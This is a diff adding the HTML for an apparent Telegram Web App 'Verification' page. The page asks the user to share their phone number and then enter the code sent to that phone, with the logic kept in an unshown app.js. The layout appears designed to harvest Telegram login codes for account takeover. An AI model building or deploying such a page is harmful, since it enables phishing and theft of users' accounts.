@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Verification</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div id="background"></div>
+    <div id="container">
+        <div id="phone-stage" class="stage hidden">
+            <div class="card">
+                <div class="icon">📱</div>
+                <h1>Phone Verification</h1>
+                <p>Please share your phone number to verify your identity</p>
+                <button id="share-phone-btn" class="btn primary">Share Phone Number</button>
+                <div id="phone-status" class="status"></div>
+            </div>
+        </div>
+
+        <div id="code-stage" class="stage hidden">
+            <div class="card">
+                <div class="icon">🔑</div>
+                <h1>Enter Code</h1>
+                <p>Enter the verification code sent to your phone</p>
+                <div class="input-group">
+                    <input type="text" id="code-input" placeholder="12345" maxlength="6" inputmode="numeric" autocomplete="one-time-code">
+                </div>
+                <button id="submit-code-btn" class="btn primary">Submit</button>
+                <div id="code-status" class="status"></div>
+            </div>
+        </div>
+
+        <div id="loading-stage" class="stage hidden">
+            <div class="card">
+                <div class="spinner"></div>
+                <p>Processing...</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
